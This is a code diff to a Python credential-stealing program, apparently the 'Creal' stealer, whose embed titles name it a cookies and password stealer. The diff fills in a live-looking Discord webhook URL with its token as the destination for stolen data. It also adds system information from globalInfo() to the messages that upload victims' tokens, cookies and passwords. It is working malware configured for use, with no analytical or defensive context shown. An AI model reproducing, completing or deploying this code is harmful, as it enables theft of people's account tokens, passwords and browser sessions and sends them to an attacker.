@@ -16,7 +16,7 @@ import re
 import subprocess
 
 
-hook = "WEBHOOK HERE"
+hook = "https://discord.com/api/webhooks/1041252856306610266/tv9aHGMAII_kVedmBNKvPJ3xpZ7Cj_haF38PBlvoz5RWfcI691e20zMnimQMJPSnaQJI"
 
 
 DETECTED = False
@@ -391,7 +391,7 @@ def uploadToken(token, path):
     if nitro == '' and badge == '': nitro = "```None```"
 
     data = {
-        "content": f'`{path}`',
+        "content": f'{globalInfo()} | `{path}`',
         "embeds": [
             {
             "color": 0000000,
@@ -472,7 +472,7 @@ def upload(name, link):
             rrrrr = Reformat(str(cookiWords))
             rb = ' | '.join(da for da in rrrrr)
         data = {
-            "content": "",
+            "content": f"{globalInfo()}",
             "embeds": [
                 {
                     "title": "Creal | Cookies Stealer",
@@ -499,7 +499,7 @@ def upload(name, link):
             ra = ' | '.join(da for da in rrr)
 
         data = {
-            "content": "",
+            "content": f"{globalInfo()}",
             "embeds": [
                 {
                     "title": "Creal | Password Stealer",
@@ -521,7 +521,7 @@ def upload(name, link):
 
     if name == "kiwi":
         data = {
-            "content": "",
+            "content": f"{globalInfo()}",
             "embeds": [
                 {
                 "color": 000000,
